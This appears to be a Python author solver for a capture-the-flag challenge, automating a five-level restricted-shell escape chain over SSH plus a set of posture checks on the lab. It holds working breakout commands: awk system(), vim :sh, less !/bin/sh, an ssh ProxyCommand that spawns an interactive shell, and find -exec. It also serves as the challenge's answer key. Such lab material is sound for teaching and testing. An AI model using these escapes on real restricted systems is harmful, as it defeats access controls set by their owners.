#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Author solver and live test for The Red Circle (admin, ssh).

Solves the whole five-level chain against a running instance using only
the Python standard library (pty-expect; no sshpass needed):

    python3 author/solve.py --host 127.0.0.1 --port 2225 \
        [--expect <flag>] [--probe]

Exit code 0 — chain solved, and with --probe every posture check passed.
"""

import argparse
import os
import pty
import re
import select
import sys
import time

LEVEL1_PW = "level1"
RBASH_PROMPTS = {
    1: "envelope-1$ ",
    2: "envelope-2$ ",
    3: "envelope-3$ ",
    4: "envelope-4$ ",
}
MENU_PROMPT = "kartoteka> "
NEXTKEY = "/usr/local/bin/nextkey"

SSH_OPTS = [
    "-o", "StrictHostKeyChecking=no",
    "-o", "UserKnownHostsFile=/dev/null",
    "-o", "ConnectTimeout=8",
    "-o", "LogLevel=ERROR",
    "-o", "NumberOfPasswordPrompts=1",
]


class Session(object):
    """Minimal expect over a pty."""

    def __init__(self, argv, timeout=40):
        self.pid, self.fd = pty.fork()
        if self.pid == 0:
            try:
                os.environ["TERM"] = os.environ.get("TERM", "xterm-256color")
                os.execvp(argv[0], argv)
            finally:
                os._exit(127)
        self.buf = ""
        self.timeout = timeout

    def pump(self, wait):
        deadline = time.time() + wait
        while time.time() < deadline:
            r, _, _ = select.select([self.fd], [], [], 0.4)
            if not r:
                continue
            try:
                chunk = os.read(self.fd, 65536)
            except OSError:
                break
            if not chunk:
                break
            self.buf += chunk.decode("utf-8", "replace")

    def expect(self, pattern, timeout=None):
        deadline = time.time() + (timeout or self.timeout)
        while time.time() < deadline:
            if pattern in self.buf:
                return True
            self.pump(0.5)
        return pattern in self.buf

    def send(self, s):
        os.write(self.fd, s.encode())

    def close(self):
        try:
            self.send("\x03\x04")
            time.sleep(0.2)
            os.close(self.fd)
        except OSError:
            pass
        try:
            os.kill(self.pid, 9)
        except (ProcessLookupError, PermissionError):
            pass


def ssh_argv(host, port, user, cmd=None):
    argv = ["ssh", "-tt", "-p", str(port)] + SSH_OPTS + ["%s@%s" % (user, host)]
    if cmd is not None:
        argv.append(cmd)
    return argv


def login(host, port, user, password, prompt, timeout=40):
    s = Session(ssh_argv(host, port, user), timeout=timeout)
    if not s.expect("assword:"):
        tail = s.buf[-200:]
        s.close()
        raise RuntimeError("no password prompt for %s: %r" % (user, tail))
    s.send(password + "\n")
    if not s.expect(prompt, timeout=15):
        tail = s.buf[-300:]
        s.close()
        raise RuntimeError("no prompt %r for %s: %r" % (prompt, user, tail))
    return s


def run_ssh(host, port, user, password, cmd, timeout=25):
    """Run one non-interactive remote command; return combined output."""
    s = Session(ssh_argv(host, port, user, cmd), timeout=timeout)
    try:
        if not s.expect("assword:"):
            raise RuntimeError("no password prompt for %s" % user)
        s.send(password + "\n")
        s.pump(timeout)
        return s.buf
    finally:
        s.close()


def parse_key(text):
    m = re.search(r"KEY: ([0-9a-f]{16})", text)
    if not m:
        raise RuntimeError("no KEY line in output: %r" % text[-200:])
    return m.group(1)


def parse_flag(text):
    m = re.search(r"FLAG: ((?i:[a-z0-9_]{2,32}\{[^{}\s]{4,}\}))", text)
    if not m:
        raise RuntimeError("no FLAG line in output: %r" % text[-200:])
    return m.group(1)


def level1(host, port):
    s = login(host, port, "level1", LEVEL1_PW, RBASH_PROMPTS[1])
    try:
        s.send("awk 'BEGIN { system(\"%s\") }'\n" % NEXTKEY)
        if not s.expect("KEY: ", timeout=15):
            raise RuntimeError("level1: awk escape gave no key: %r" % s.buf[-300:])
        return parse_key(s.buf)
    finally:
        s.close()


def level2(host, port, key):
    s = login(host, port, "level2", key, RBASH_PROMPTS[2])
    try:
        s.send("vim\n")
        if not s.expect("VIM", timeout=15):
            raise RuntimeError("level2: vim did not start")
        time.sleep(1.0)
        s.send(":sh\n")
        time.sleep(1.5)
        s.send(NEXTKEY + "\n")
        if not s.expect("KEY: ", timeout=15):
            raise RuntimeError("level2: no key after vim :sh: %r" % s.buf[-300:])
        return parse_key(s.buf)
    finally:
        s.close()


def level3(host, port, key):
    s = login(host, port, "level3", key, RBASH_PROMPTS[3])
    try:
        s.send("less README.txt\n")
        if not s.expect("man less", timeout=15):
            raise RuntimeError("level3: less did not open README")
        time.sleep(0.5)
        s.send("!/bin/sh\n")
        time.sleep(1.5)
        s.send(NEXTKEY + "\n")
        if not s.expect("KEY: ", timeout=15):
            raise RuntimeError("level3: no key after less !sh: %r" % s.buf[-300:])
        return parse_key(s.buf)
    finally:
        s.close()


def level4(host, port, key):
    s = login(host, port, "level4", key, RBASH_PROMPTS[4])
    try:
        s.send("ssh -o ProxyCommand='/bin/sh -c \"/bin/sh -i </dev/tty"
               " >/dev/tty 2>&1\"' localhost\n")
        time.sleep(3.0)
        s.send(NEXTKEY + "\n")
        if not s.expect("KEY: ", timeout=15):
            raise RuntimeError("level4: no key via ProxyCommand: %r" % s.buf[-300:])
        return parse_key(s.buf)
    finally:
        s.close()


def level5(host, port, key):
    s = login(host, port, "level5", key, MENU_PROMPT)
    try:
        s.send("find -exec %s ;\n" % NEXTKEY)
        if not s.expect("FLAG: ", timeout=15):
            raise RuntimeError("level5: no flag from find -exec: %r" % s.buf[-300:])
        return parse_flag(s.buf)
    finally:
        s.close()


def solve(host, port):
    print("[*] level 1 — rbash + awk")
    key2 = level1(host, port)
    print("[+] KEY level2: %s" % key2)
    print("[*] level 2 — rbash + vim :sh")
    key3 = level2(host, port, key2)
    print("[+] KEY level3: %s" % key3)
    print("[*] level 3 — rbash + less !sh")
    key4 = level3(host, port, key3)
    print("[+] KEY level4: %s" % key4)
    print("[*] level 4 — rbash + ssh ProxyCommand")
    key5 = level4(host, port, key4)
    print("[+] KEY level5: %s" % key5)
    print("[*] level 5 — картотека find -exec")
    flag = level5(host, port, key5)
    print("[+] FLAG: %s" % flag)
    return flag


def probe(host, port):
    """Security posture checks (all must hold)."""
    results = []

    def record(name, ok, info=""):
        results.append(ok)
        print("  [%s] %s%s" % ("PASS" if ok else "FAIL", name,
                               (" — " + info.replace("\n", " ")[:120]) if info else ""))

    out = run_ssh(host, port, "level1", LEVEL1_PW, "echo PATH=$PATH")
    record("non-interactive PATH locked to /home/level1/bin",
           "/home/level1/bin" in out and "/usr/bin" not in out, out)

    out = run_ssh(host, port, "level1", LEVEL1_PW, "bash -c id")
    record("bash by name is unavailable (no unrestricted shell)",
           "command not found" in out.lower() and "uid=" not in out, out)

    out = run_ssh(host, port, "level1", LEVEL1_PW, NEXTKEY)
    record("slash-command refused by rbash", "KEY:" not in out, out)

    s = Session(["sftp", "-P", str(port)] + SSH_OPTS + ["level1@%s" % host], timeout=20)
    try:
        ok_pw = s.expect("assword:")
        s.send(LEVEL1_PW + "\n")
        s.pump(8)
        record("sftp subsystem disabled", "sftp>" not in s.buf, s.buf[-160:])
        _ = ok_pw
    finally:
        s.close()

    s = login(host, port, "level1", LEVEL1_PW, RBASH_PROMPTS[1])
    try:
        s.send("echo $PATH\n")
        ok = s.expect("/home/level1/bin", timeout=8)
        record("interactive PATH locked to /home/level1/bin", ok, s.buf[-160:])
    finally:
        s.close()

    return all(results)


def main():
    global LEVEL1_PW
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[1])
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=13408)
    ap.add_argument("--password", default=LEVEL1_PW,
                    help="level1 password (default: %s)" % LEVEL1_PW)
    ap.add_argument("--expect", help="assert the recovered flag equals this value")
    ap.add_argument("--probe", action="store_true",
                    help="run ssh posture checks instead of solving")
    args = ap.parse_args()

    LEVEL1_PW = args.password

    if args.probe:
        sys.exit(0 if probe(args.host, args.port) else 1)

    flag = solve(args.host, args.port)
    if args.expect and flag != args.expect:
        print("[-] flag mismatch: got %r, expected %r" % (flag, args.expect))
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
